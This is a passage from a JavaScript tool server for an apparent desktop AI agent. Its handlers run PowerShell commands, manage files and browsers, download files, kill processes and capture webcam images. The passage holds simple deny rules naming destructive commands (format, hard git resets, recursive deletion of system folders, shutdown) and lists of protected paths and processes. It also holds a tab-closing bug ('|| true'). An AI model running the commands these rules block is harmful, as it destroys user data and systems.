$found = $false
foreach ($el in $els) {
  try {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $r2 = $el.Current.BoundingRectangle
    if ($n -and $r2.Width -gt 0 -and $r2.Width -lt 2000 -and $r2.Height -gt 0) {
      if ($n -like "*$target*") {
        $cx = [int]($r2.X + $r2.Width/2); $cy = [int]($r2.Y + $r2.Height/2)
        # Bring window to front
        try { [W]::SetForegroundWindow($el.Current.NativeWindowHandle) } catch {}
        Start-Sleep -Milliseconds 150
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($cx, $cy)
        Start-Sleep -Milliseconds 80
        ${ce}
        Write-Output "CLICKED: '$n' [$t] at ($cx,$cy)"
        $found = $true; break
      }
    }
  } catch { continue }
}
if (-not $found) {
  Write-Output "NOT FOUND: '$target'"
  # Show closest matches
  $matches = @()
  foreach ($el in $els) {
    try {
      $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
      $r2 = $el.Current.BoundingRectangle
      if ($n -and $r2.Width -gt 0 -and ($n.Length -lt 50)) {
        $matches += [PSCustomObject]@{Name=$n; Type=$t -replace 'ControlType.'; X=$r2.X;Y=$r2.Y}
      }
    } catch { continue }
  }
  $matches | Select-Object -First 15 | Format-Table -AutoSize | Out-String
}
`, 20000);
      return ok(r);
    }
    case 'ui_get_screen_layout': {
      // Complete screen layout: all windows and their elements
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes, System.Windows.Forms
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
$types = 'Button','MenuItem','TabItem','Hyperlink','ListItem','Edit','ComboBox','Slider','RadioButton','CheckBox','TreeItem','Group','Custom'
$windows = @{}
foreach ($el in $els) {
  try {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $wn = $el.Current.ProcessName
    $r2 = $el.Current.BoundingRectangle
    if ($n -and $r2.Width -gt 3 -and $r2.Height -gt 3 -and $wn) {
      $typeMatch = $types | Where-Object { $t -match $_ }
      if ($typeMatch) {
        if (-not $windows.ContainsKey($wn)) {
          $windows[$wn] = @{Title=$wn; Elements=@()}
        }
        $windows[$wn].Elements += [PSCustomObject]@{
          Name = $n.Substring(0, [Math]::Min($n.Length, 50))
          Type = $t -replace 'ControlType.',''
          X=$r2.X; Y=$r2.Y; W=$r2.Width; H=$r2.Height
        }
      }
    }
  } catch { continue }
}
$windows.GetEnumerator() | Select-Object -First 10 | ForEach-Object {
  Write-Output "WINDOW: $($_.Value.Title)"
  $_.Value.Elements | Select-Object -First 20 | ForEach-Object {
    Write-Output "  [$($_.Type)] '$($_.Name)' @ ($($_.X),$($_.Y)) ${$_.W}x${$_.H}"
  }
}
Write-Output "---"
Write-Output "Total windows: $($windows.Count)"
`, 15000);
      return ok(r);
    }
    case 'ui_get_element_at': {
      const x = args.x, y = args.y;
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern IntPtr WindowFromPoint(int x,int y);[DllImport("user32.dll")]public static extern IntPtr ChildWindowFromPoint(IntPtr h,int x,int y);' -Name W -Namespace P
$pt = New-Object System.Drawing.Point(${x}, ${y})
$hwnd = [P.W]::WindowFromPoint(${x}, ${y})
if ($hwnd -ne [IntPtr]::Zero) {
  Add-Type -AssemblyName UIAutomationClient
  $el = [System.Windows.Automation.AutomationElement]::FromHandle($hwnd)
  if ($el) {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $r2 = $el.Current.BoundingRectangle
    $wn = $el.Current.ProcessName
    Write-Output "Element at ($(${x}),$(${y})):"
    Write-Output "  Name: $n"
    Write-Output "  Type: $t"
    Write-Output "  Window: $wn"
    Write-Output "  Bounds: ($($r2.X),$($r2.Y)) ${$r2.Width}x${$r2.Height}"
  }
} else { Write-Output "No element found at ($(${x}),$(${y}))" }
`, 10000);
      return ok(r);
    }
    case 'file_read': {
      try {
        const filePath = typeof args.path === 'string' ? args.path : String(args.path || '');
        const max = typeof args.max_lines === 'number' ? args.max_lines : Infinity;
        const content = fs.readFileSync(filePath, 'utf8');
        const lines = content.split('\n');
        const sliced = lines.slice(0, max);
        const text = sliced.join('\n');
        const more = lines.length > max ? `\n...(${lines.length - max} more lines)` : '';
        const truncated = text.length > 8000 ? text.substring(0, 8000) + '\n...(truncated at 8000 chars)' : text;
        return ok(`${filePath} (${lines.length} lines):\n${truncated}${more}`);
      } catch (e) { return ok(`Error: ${e.message}`); }
    }
    case 'file_write': {
      try {
        const dir = path.dirname(args.path);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        if (args.append) fs.appendFileSync(args.path, args.content);
        else fs.writeFileSync(args.path, args.content);
        return ok(`Written: ${args.path} (${args.content.length} chars)`);
      } catch (e) { return ok(`Error: ${e.message}`); }
    }
    case 'file_list': {
      try {
        const entries = fs.readdirSync(args.path, { withFileTypes: true });
        const list = entries.map(e => {
          if (e.isDirectory()) return `D ${e.name}/`;
          try { const s = fs.statSync(path.join(args.path, e.name)); return `F ${e.name} (${(s.size / 1024).toFixed(1)}KB)`; }
          catch (e) { return `F ${e.name}`; }
        });
        return ok(`${args.path}:\n${list.join('\n')}`);
      } catch (e) { return ok(`Error: ${e.message}`); }
    }
    case 'file_search': {
      try {
        const query = (args.query || '').toLowerCase();
        const maxDepth = args.max_depth || 3;
        const results = [];
        const searchDir = (dir, depth) => {
          if (depth > maxDepth || results.length >= 50) return;
          try {
            const entries = fs.readdirSync(dir, { withFileTypes: true });
            for (const e of entries) {
              if (results.length >= 50) break;
              const full = path.join(dir, e.name);
              if (e.name.toLowerCase().includes(query)) results.push(full);
              if (e.isDirectory() && !e.name.startsWith('.') && e.name !== 'node_modules' && e.name !== '__pycache__') searchDir(full, depth + 1);
            }
          } catch (e) {}
        };
        if (args.in_content) {
          const searchContent = (dir, depth) => {
            if (depth > 2 || results.length >= 30) return;
            try {
              const entries = fs.readdirSync(dir, { withFileTypes: true });
              for (const e of entries) {
                if (results.length >= 30) break;
                const full = path.join(dir, e.name);
                if (e.isFile() && e.name.match(/\.(js|ts|py|md|txt|json|html|css|yaml|yml|toml|cfg|ini|bat|sh|ps1)$/i)) {
                  try {
                    const content = fs.readFileSync(full, 'utf8');
                    if (content.toLowerCase().includes(query)) {
                      const lineNum = content.substring(0, content.toLowerCase().indexOf(query)).split('\n').length;
                      results.push(`${full}:${lineNum}`);
                    }
                  } catch (e) {}
                }
                if (e.isDirectory() && !e.name.startsWith('.') && e.name !== 'node_modules') searchContent(full, depth + 1);
              }
            } catch (e) {}
          };
          searchContent(args.path, 0);
          return ok(results.length ? `Content matches (${results.length}):\n${results.join('\n')}` : `No content matches for "${args.query}"`);
        }
        searchDir(args.path, 0);
        return ok(results.length ? `Found (${results.length}):\n${results.join('\n')}` : `No matches for "${args.query}"`);
      } catch (e) { return ok(`Search error: ${e.message}`); }
    }
    case 'browser_open': {
      try {
        const page = await getBrowserPage();
        await page.goto(args.url, { waitUntil: 'domcontentloaded', timeout: 30000 });
        const title = await page.title();
        return ok(`Opened: ${args.url}\nTitle: ${title}`);
      } catch (e) {
        // RIP-OUT FIX: replaced `exec(start chrome ...)` (which spawned
        // a detached cmd.exe and leaked) with trackedSpawn. Falls
        // through to printing the URL if the OS handler fails.
        try {
          trackedSpawn('rundll32', ['url.dll,FileProtocolHandler', args.url], {
            tag: `browser_open(${args.url})`, timeoutMs: 5_000, windowsHide: true,
          });
          return ok(`Opened via shell: ${args.url} (Playwright: ${e.message})`);
        } catch (e2) {
          return ok(`Could not open browser (${e2.message}). URL: ${args.url}`);
        }
      }
    }
    case 'browser_click': {
      try {
        const page = await getBrowserPage();
        const target = args.target;
        const idx = args.index || 0;
        let els = await page.getByText(target, { exact: false }).all().catch(() => []);
        if (!els.length) els = await page.getByRole('link', { name: target }).all().catch(() => []);
        if (!els.length) els = await page.getByRole('button', { name: target }).all().catch(() => []);
        if (!els.length) els = await page.locator(target).all().catch(() => []);
        if (els.length > idx) {
          await els[idx].click({ timeout: 5000 });
          await page.waitForLoadState('domcontentloaded', { timeout: 10000 }).catch(() => {});
          const newTitle = await page.title();
          return ok(`Clicked: "${target}" (match ${idx + 1}/${els.length})\nPage: ${newTitle}\nURL: ${page.url()}`);
        }
        const links = await page.locator('a, button, [role="button"]').all();
        const clickable = [];
        for (const el of links.slice(0, 20)) {
          const txt = await el.textContent().catch(() => '');
          if (txt && txt.trim().length > 0 && txt.trim().length < 80) clickable.push(txt.trim());
        }
        return ok(`"${target}" not found.\nClickable:\n${clickable.map(c => `  ${c}`).join('\n')}`);
      } catch (e) { return ok(`Click error: ${e.message}`); }
    }
    case 'browser_type': {
      try {
        const page = await getBrowserPage();
        if (args.selector) {
          const el = await page.locator(args.selector).first();
          await el.fill(args.text);
        } else {
          const el = await page.locator('input:visible, textarea:visible').first();
          await el.fill(args.text);
        }
        if (args.submit) await page.keyboard.press('Enter');
        return ok(`Typed: "${args.text}"${args.submit ? ' + Enter' : ''}`);
      } catch (e) { return ok(`Type error: ${e.message}`); }
    }
    case 'browser_scroll': {
      try {
        const page = await getBrowserPage();
        const px = args.amount || 500;
        const dir = (args.direction || 'down') === 'up' ? -px : px;
        await page.evaluate((d) => window.scrollBy(0, d), dir);
        return ok(`Scrolled ${args.direction || 'down'} ${px}px`);
      } catch (e) { return ok(`Scroll error: ${e.message}`); }
    }
    case 'browser_get_content': {
      try {
        const page = await getBrowserPage();
        let text = null;
        if (args.selector) text = await page.locator(args.selector).first().textContent({ timeout: 5000 });
        else text = await page.locator('body').textContent({ timeout: 5000 });
        const maxLen = args.max_length || 3000;
        const title = await page.title();
        const url = page.url();
        return ok(`Page: ${title}\nURL: ${url}\n\n${(text || '').substring(0, maxLen)}`);
      } catch (e) { return ok(`Content error: ${e.message}`); }
    }
    case 'browser_screenshot': {
      try {
        const page = await getBrowserPage();
        const outPath = path.join(os.tmpdir(), `browser_${Date.now()}.png`);
        await page.screenshot({ path: outPath, fullPage: false });
        const title = await page.title();
        return ok(`Browser screenshot: ${outPath}\nPage: ${title}\nURL: ${page.url()}`);
      } catch (e) { return ok(`Screenshot error: ${e.message}`); }
    }
    case 'browser_navigate': {
      try {
        const page = await getBrowserPage();
        if (args.url) await page.goto(args.url, { waitUntil: 'domcontentloaded', timeout: 30000 });
        else if (args.action === 'back') await page.goBack({ waitUntil: 'domcontentloaded', timeout: 15000 });
        else if (args.action === 'forward') await page.goForward({ waitUntil: 'domcontentloaded', timeout: 15000 });
        else if (args.action === 'reload') await page.reload({ waitUntil: 'domcontentloaded', timeout: 15000 });
        const title = await page.title();
        return ok(`Navigated: ${title}\nURL: ${page.url()}`);
      } catch (e) { return ok(`Navigate error: ${e.message}`); }
    }
    case 'browser_tabs': {
      try {
        const ctx = await getBrowserContext();
        const pages = ctx.pages();
        const list = [];
        for (let i = 0; i < pages.length; i++) list.push(`${i + 1}. ${await pages[i].title()} — ${pages[i].url().substring(0, 60)}`);
        return ok(`Browser Tabs (${pages.length}):\n${list.join('\n')}`);
      } catch (e) { return ok(`Tabs error: ${e.message}`); }
    }
    case 'browser_close_tab': {
      try {
        const ctx = await getBrowserContext();
        const pages = ctx.pages();
        let target = null;
        if (args.index !== undefined && args.index < pages.length) target = pages[args.index];
        else if (args.title) target = pages.find(p => p.url().includes(args.title) || true);
        if (target) { await target.close(); return ok('Tab closed'); }
        return ok('Tab not found');
      } catch (e) { return ok(`Close error: ${e.message}`); }
    }
    case 'purpclaw_start': {
      if (purpProc) return ok('Pipeline already running. Use purpclaw_stop first.');
      const outDir = args.output_dir || path.join('C:\\Users\\Admin\\Desktop', args.task.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 30));
      const pstate = { task: args.task, output_dir: outDir, stage: 'starting', started: new Date().toISOString(), status: 'running' };
      fs.writeFileSync(PURP_STATE, JSON.stringify(pstate, null, 2));
      fs.writeFileSync(PURP_LOG, '');
      if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });
      // RIP-OUT FIX (2026-06-06): the old code spawned a 200-line
      // `node -e "..."` template literal with `shell: true`. On
      // Windows that became `cmd.exe /c node -e "..."` which leaked
      // and was impossible to debug. We now spawn a real worker
      // file with no shell, tracked via child-registry, with a
      // hard 5-minute budget.
      const workerPath = path.join(__dirname, 'lib', 'workers', 'purp-worker.js');
      purpProc = trackedSpawn(
        process.execPath,
        [
          workerPath,
          '--state', PURP_STATE,
          '--log',   PURP_LOG,
          '--out',   outDir,
          '--task',  args.task,
          '--gw',    OPENCLAW_GW,
        ],
        {
          tag: `purp-pipeline(${args.task.slice(0, 40)})`,
          cwd: PURP_DIR,
          windowsHide: true,
          shell: false,
          stdio: ['ignore', 'pipe', 'pipe'],
          timeoutMs: 5 * 60_000,  // hard 5-min budget matches train.py
        }
      );
      purpProc.stdout?.on('data', d => purpOut += d.toString());
      purpProc.stderr?.on('data', d => purpOut += d.toString());
      purpProc.on('close', () => { purpProc = null; });
      return ok(`PURPCLAW Pipeline STARTED!\nTask: ${args.task}\nOutput: ${outDir}`);
    }
    case 'purpclaw_stop': {
      if (purpProc) {
        // Force-kill via the registry (SIGTERM, then SIGKILL after grace)
        try { purpProc.kill('SIGTERM'); } catch {}
        setTimeout(() => { try { purpProc?.kill('SIGKILL'); } catch {} }, 1500);
        purpProc = null;
        try {
          const s = JSON.parse(fs.readFileSync(PURP_STATE, 'utf8'));
          s.status = 'stopped';
          fs.writeFileSync(PURP_STATE, JSON.stringify(s, null, 2));
        } catch (e) {}
        return ok('Pipeline STOPPED.');
      }
      return ok('No pipeline running.');
    }
    case 'purpclaw_status': {
      try {
        const s = JSON.parse(fs.readFileSync(PURP_STATE, 'utf8'));
        return ok(`PURPCLAW\nTask: ${s.task}\nStage: ${s.stage}\nStatus: ${s.status}\nStarted: ${s.started}${s.completed ? '\nDone: ' + s.completed : ''}${s.error ? '\nError: ' + s.error : ''}\nProcess: ${purpProc ? 'ACTIVE' : 'idle'}`);
      } catch (e) { return ok('PURPCLAW: idle'); }
    }
    case 'purpclaw_logs': {
      try { const log = fs.readFileSync(PURP_LOG, 'utf8'); const lines = log.split('\n'); return ok(lines.slice(-(args.lines || 50)).join('\n') || 'No logs'); }
      catch (e) { return ok('No logs'); }
    }
    case 'git_command': {
      if (/force|reset\s+--hard|clean\s+-fdx/i.test(args.command)) return ok('BLOCKED: Dangerous git op');
      const r = await cmd(`git ${args.command}`, 15000);
      return ok(r);
    }
    case 'http_request': {
      const r = await httpReq(args.url, args.method || 'GET', args.body);
      return ok(r);
    }
    case 'clipboard': {
      if (args.action === 'read') { const r = await ps('Get-Clipboard', 5000); return ok(r || 'Empty'); }
      if (args.action === 'write' && args.text) { await ps(`Set-Clipboard -Value '${san(args.text)}'`, 5000); return ok(`Copied ${args.text.length} chars`); }
      return ok('Action: read or write');
    }
    case 'execute_command': {
      if (/format\s+[a-z]:|Remove-Item\s+-Recurse\s+C:\\(Windows|Program)|shutdown\s+\/s/i.test(args.command)) return ok('BLOCKED');
      const { stdout, stderr } = await execAsync(args.command, { cwd: args.cwd || 'C:\\Users\\Admin\\Desktop', shell: 'powershell.exe', timeout: 30000 }).catch(e => ({ stdout: '', stderr: e.message }));
      return ok((stdout || stderr || 'Done').substring(0, 4000));
    }
    case 'open_application': {
      const map = { 'chrome': 'chrome', 'blender': 'C:\\Program Files\\Blender Foundation\\Blender 4.4\\blender.exe', 'vscode': 'code', 'explorer': 'explorer', 'notepad': 'notepad', 'terminal': 'wt', 'obs': 'C:\\Program Files\\obs-studio\\bin\\64bit\\obs64.exe' };
      const app = map[args.app_name?.toLowerCase()] || args.app_name;
      // RIP-OUT FIX: `start "" "app"` spawned a detached cmd.exe that
      // leaked. Replaced with trackedSpawn — tracked, time-bounded,
      // windows-hidden, no `shell: true`.
      try {
        trackedSpawn(app, [], { tag: `open_app(${app})`, timeoutMs: 10_000, windowsHide: true });
        return ok(`Opened: ${args.app_name}`);
      } catch (e) {
        return ok(`Could not open ${args.app_name}: ${e.message}`);
      }
    }
        case 'speak': {
      const bat = args.long ? KOKORO_LONG : KOKORO;
      // RIP-OUT FIX: was the old exec(..., {shell:'cmd.exe'}) pattern.
      // Now uses trackedSpawn with no shell, hard 60s timeout, and
      // windowsHide so no new console windows pop up.
      try {
        const safeMsg = (args.message || '').replace(/[\u000A\u000D"]/g, ' ').slice(0, 2000);
        trackedSpawn('powershell.exe',
          ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', bat, safeMsg],
          { tag: 'speak', timeoutMs: 60_000, windowsHide: true, stdio: 'ignore' });
        return ok('Speaking: ' + args.message);
      } catch (e) { return ok('Speak error: ' + e.message); }
    }

    case 'memory': {
      const mem = loadMemory();
      switch (args.action) {
        case 'remember': mem.facts.push({ c: args.content, t: new Date().toISOString() }); saveMemory(mem); return ok(`Remembered (${mem.facts.length} total): ${args.content}`);
        case 'recall': { const q = (args.content || '').toLowerCase(); const m = mem.facts.filter(f => f.c.toLowerCase().includes(q)); return ok(m.length ? m.map(x => `* ${x.c}`).join('\n') : 'No matches'); }
        case 'forget': { const b = mem.facts.length; mem.facts = mem.facts.filter(f => !f.c.toLowerCase().includes((args.content || '').toLowerCase())); saveMemory(mem); return ok(`Forgot ${b - mem.facts.length}`); }
        case 'list': return ok(mem.facts.length ? mem.facts.map(f => `* ${f.c}`).join('\n') : 'No memories');
        default: return ok('Actions: remember, recall, forget, list');
      }
    }
    case 'notification': {
      await psScript(`
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.BalloonTipTitle = '${san(args.title)}'
$n.BalloonTipText = '${san(args.message)}'
$n.Visible = $true
$n.ShowBalloonTip(3000)
Start-Sleep -Seconds 4
$n.Dispose()
`, 8000);
      return ok(`${args.title}: ${args.message}`);
    }
    case 'task_schedule': {
      const id = ++taskId;
      const timer = setTimeout(async () => {
        const t = taskQueue.find(x => x.id === id);
        try {
          const agentName = args.command.toLowerCase().trim();
          if (SWARM_AGENTS.includes(agentName)) {
            try {
              const swarm = require('../companion_swarm.js');
              const agent = swarm.spawnAgent(agentName, args.description);
              if (t) { t.status = 'done'; t.result = `Swarm agent ${agentName} spawned: ${agent.id}`; }
            } catch (e) { if (t) { t.status = 'error'; t.result = `Swarm error: ${e.message}`; } }
          } else {
            const result = await ps(args.command, 30000);
            if (t) { t.status = 'done'; t.result = result.substring(0, 300); }
          }
        } catch (e) { if (t) { t.status = 'error'; t.result = e.message; } }
      }, (args.delay_seconds || 60) * 1000);
      taskQueue.push({ id, desc: args.description, status: 'scheduled', scheduledAt: new Date().toISOString() });
      return ok(`Task #${id}: "${args.description}" in ${args.delay_seconds}s`);
    }
    case 'task_list': {
      if (!taskQueue.length) return ok('No tasks');
      return ok(taskQueue.map(t => `#${t.id} [${t.status}] ${t.desc}${t.result ? ' -> ' + t.result : ''}`).join('\n'));
    }
    case 'webcam_look': {
      const camIdx = args.camera || 0;
      const outPath = path.join(os.tmpdir(), `webcam_${Date.now()}.jpg`);
      const pyScript = `
import cv2, json
# Use DirectShow backend on Windows for reliable camera access
cap = cv2.VideoCapture(${camIdx}, cv2.CAP_DSHOW)
cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
if not cap.isOpened():
    # Try Microsoft Media Foundation as fallback
    cap = cv2.VideoCapture(${camIdx}, cv2.CAP_MSMF)
if not cap.isOpened():
    print(json.dumps({"error": "Cannot open webcam ${camIdx}"}))
else:
    # Allow camera to warm up
    for _ in range(3):
        cap.read()
    ret, frame = cap.read()
    cap.release()
    if ret and frame is not None:
        cv2.imwrite(r"${outPath.replace(/\\/g, '\\\\')}", frame)
        h, w = frame.shape[:2]
        print(json.dumps({"path": r"${outPath.replace(/\\/g, '\\\\')}", "width": w, "height": h}))
    else:
        print(json.dumps({"error": "Failed to capture frame"}))
`;
      const tmp = path.join(os.tmpdir(), `wcam_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 15000 }).catch(e => ({ stdout: `{"error":"${e.message}"}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      try {
        const data = JSON.parse(r.stdout.trim().split('\n').pop());
        if (data.error) return ok(`Webcam error: ${data.error}`);
        return ok(`Webcam captured: ${data.width}x${data.height}\nSaved: ${data.path}`);
      } catch (e) { return ok(r.stdout || 'Webcam capture failed'); }
    }
    case 'webcam_detect': {
      const camIdx = args.camera || 0;
      const outPath = path.join(os.tmpdir(), `wcam_det_${Date.now()}.jpg`);
      const confidence = args.confidence || 0.4;
      // Capture frame first
      const pyCapture = `
import cv2, json, sys, base64
cap = cv2.VideoCapture(${camIdx}, cv2.CAP_DSHOW)
cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
if not cap.isOpened():
    cap = cv2.VideoCapture(${camIdx}, cv2.CAP_MSMF)
if not cap.isOpened():
    print(json.dumps({"error": "Cannot open camera ${camIdx}"}))
    sys.exit(1)
for _ in range(3):
    cap.read()
ret, frame = cap.read()
cap.release()
if not ret or frame is None:
    print(json.dumps({"error": "No frame captured"}))
    sys.exit(1)
cv2.imwrite(r"${outPath.replace(/\\/g, '\\\\')}", frame)
# Encode as base64 for YOLO service
_, buf = cv2.imencode('.jpg', frame)
img_b64 = base64.b64encode(buf).decode('ascii')
print(json.dumps({"success": true, "image_b64": img_b64, "path": r"${outPath.replace(/\\/g, '\\\\')}"}))
`;
      const tmpCap = path.join(os.tmpdir(), `wcam_cap_${Date.now()}.py`);
      fs.writeFileSync(tmpCap, pyCapture);
      const rCap = await execAsync(`py -3.11 "${tmpCap}"`, { timeout: 15000 }).catch(e => ({ stdout: `{"error":"${e.message}"}` }));
      try { fs.unlinkSync(tmpCap); } catch (e) {}
      try {
        const capData = JSON.parse(rCap.stdout.trim().split('\n').pop());
        if (capData.error) return ok(`Webcam error: ${capData.error}`);
        // Send to YOLO service
        const body = JSON.stringify({ image: capData.image_b64, confidence });
        const postData = Buffer.from(body);
        const yoloReq = await new Promise((resolve) => {
          const options = {
            hostname: '127.0.0.1',
            port: 7779,
            path: '/detect',
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length }
          };
          const yoloConn = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
          });
          yoloConn.on('error', () => resolve(null));
          yoloConn.write(postData);
          yoloConn.end();
        }).catch(() => null);
        if (!yoloReq) return ok('YOLO service unavailable - ensure yolo_service.py is running');
        const yoloResult = JSON.parse(yoloReq);
        if (!yoloResult.success) return ok(`Detection error: ${yoloResult.error}`);
        let out = `Webcam Detection: ${yoloResult.count} objects found\n`;
        yoloResult.objects.forEach(o => { out += `  ${o.class} (${(o.conf*100).toFixed(0)}%)\n`; });
        out += `Image: ${capData.path}`;
        return ok(out);
      } catch (e) { return ok(rCap.stdout || 'Detection failed'); }
    }
    case 'webcam_read': {
      const camIdx = args.camera || 0;
      const pyScript = `
import cv2, json, sys
cap = cv2.VideoCapture(${camIdx}, cv2.CAP_DSHOW)
cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
if not cap.isOpened():
    cap = cv2.VideoCapture(${camIdx}, cv2.CAP_MSMF)
if not cap.isOpened():
    print(json.dumps({"error": "Cannot open camera ${camIdx}"}))
    sys.exit(1)
for _ in range(3):
    cap.read()
cap.grab()
ret, frame = cap.read()
cap.release()
if not ret or frame is None:
    print(json.dumps({"error": "No frame captured"}))
    sys.exit(1)
gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
text = ""
try:
    import easyocr
    reader = easyocr.Reader(['en'], gpu=False, verbose=False)
    results = reader.readtext(gray)
    text = " ".join([r[1] for r in results]).strip()
except ImportError:
    pass
if not text:
    try:
        import pytesseract
        pytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
        text = pytesseract.image_to_string(gray).strip()
    except Exception as e:
        if not text: text = ""
print(json.dumps({"text": text, "words": len(text.split()) if text else 0}))
`;
      const tmp = path.join(os.tmpdir(), `wcam_ocr_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 60000 }).catch(e => ({ stdout: `{"error":"${e.message}"}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      try {
        const data = JSON.parse(r.stdout.trim().split('\n').pop());
        if (data.error) return ok(`OCR error: ${data.error}`);
        return ok(`Webcam Text (${data.words} words):\n${data.text || '(no text visible)'}`);
      } catch (e) { return ok(r.stdout || 'Webcam OCR failed'); }
    }
    case 'file_copy': {
      try {
        const stat = fs.statSync(args.source);
        if (stat.isDirectory()) {
          const r = await cmd(`robocopy "${args.source}" "${args.destination}" /E /NFL /NDL /NJH /NJS /NC /NS /NP 2>nul`, 120000);
          return ok(`Copied directory: ${args.source} -> ${args.destination}`);
        } else {
          await ps(`Copy-Item -LiteralPath '${san(args.source)}' -Destination '${san(args.destination)}' -Force`, 30000);
          return ok(`Copied: ${args.source} -> ${args.destination}`);
        }
      } catch (e) { return ok(`Copy error: ${e.message}`); }
    }
    case 'file_move': {
      try {
        const isDir = fs.statSync(args.source).isDirectory();
        if (isDir) {
          await cmd(`robocopy "${args.source}" "${args.destination}" /E /MOV /NFL /NDL /NJH /NJS /NC /NS /NP 2>nul`, 120000);
          try { fs.rmSync(args.source, { recursive: true, force: true }); } catch (e) {}
          return ok(`Moved directory: ${args.source} -> ${args.destination}`);
        } else {
          await ps(`Move-Item -LiteralPath '${san(args.source)}' -Destination '${san(args.destination)}' -Force`, 30000);
          return ok(`Moved: ${args.source} -> ${args.destination}`);
        }
      } catch (e) { return ok(`Move error: ${e.message}`); }
    }
    case 'file_delete': {
      if (/^[A-Z]:\\(Windows|Program Files|Users\\Admin\\AppData)/i.test(args.path)) return ok('BLOCKED: Cannot delete system paths');
      try {
        await ps(`Remove-Item -LiteralPath '${san(args.path)}' -Force -Recurse -ErrorAction Stop`, 30000);
        return ok(`Deleted: ${args.path}`);
      } catch (e) { return ok(`Delete error: ${e.message}`); }
    }
    case 'dir_create': {
      try { fs.mkdirSync(args.path, { recursive: true }); return ok(`Created directory: ${args.path}`); }
      catch (e) { return ok(`Dir error: ${e.message}`); }
    }
    case 'download_file': {
      try {
        const dest = args.destination || path.join('C:\\Users\\Admin\\Downloads', path.basename(new URL(args.url).pathname) || `download_${Date.now()}`);
        const destDir = path.dirname(dest);
        if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
        await execAsync(`powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri '${san(args.url)}' -OutFile '${dest}' -UseBasicParsing"`, { timeout: 120000 });
        const size = fs.existsSync(dest) ? (fs.statSync(dest).size / 1024).toFixed(1) : '?';
        return ok(`Downloaded: ${dest} (${size}KB)\nFrom: ${args.url}`);
      } catch (e) { return ok(`Download error: ${e.message}`); }
    }
    case 'process_list': {
      try {
        const ps = `
Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 Name, Id, @{N="CPU(s)";E={[math]::Round($_.CPU,1)}}, @{N="MB";E={[math]::Round($_.WorkingSet64/1MB,1)}} | Format-Table -AutoSize | Out-String
`;
        const r = await psScript(ps, 8000);
        return ok(r);
      } catch (e) { return ok(`Process list error: ${e.message}`); }
    }
    case 'process_kill': {
      const blocked = ['explorer', 'csrss', 'lsass', 'winlogon', 'svchost', 'system'];
      if (args.name && blocked.includes(args.name.toLowerCase().replace('.exe', ''))) return ok('BLOCKED: Critical process');
      try {
        if (args.pid) { await cmd(`taskkill /PID ${args.pid} /F`, 5000); return ok(`Killed PID ${args.pid}`); }
        if (args.name) { await cmd(`taskkill /IM "${san(args.name)}" /F`, 5000); return ok(`Killed: ${args.name}`); }
        return ok('Specify name or pid');
      } catch (e) { return ok(`Kill error: ${e.message}`); }
    }
    case 'volume_control': {
      try {
        const action = args.action || 'set';
        if (action === 'mute') {
          await psScript(`$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]173)`, 5000);
          return ok('Muted');
        }
        if (action === 'unmute') {
          await psScript(`$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]173)`, 5000);
          return ok('Unmuted (toggle)');
        }
        const vol = Math.min(100, Math.max(0, args.level || 50));
        const steps = action === 'up' ? 5 : action === 'down' ? -5 : 0;
        if (steps !== 0) {
          const key = steps > 0 ? 175 : 174;
          for (let i = 0; i < Math.abs(steps); i++) await psScript(`$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]${key})`, 2000);
          return ok(`Volume ${action}`);
        }
        await psScript(`
Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume { int f(); int g(); int h(); int i(); int j(); int k(); int l(); int m(); int n(); int o(); int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext); }
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator { int EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices); int GetDefaultAudioEndpoint(int dataFlow, int role, out IntPtr ppEndpoint); }
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio {
    public static void SetVolume(float level) {
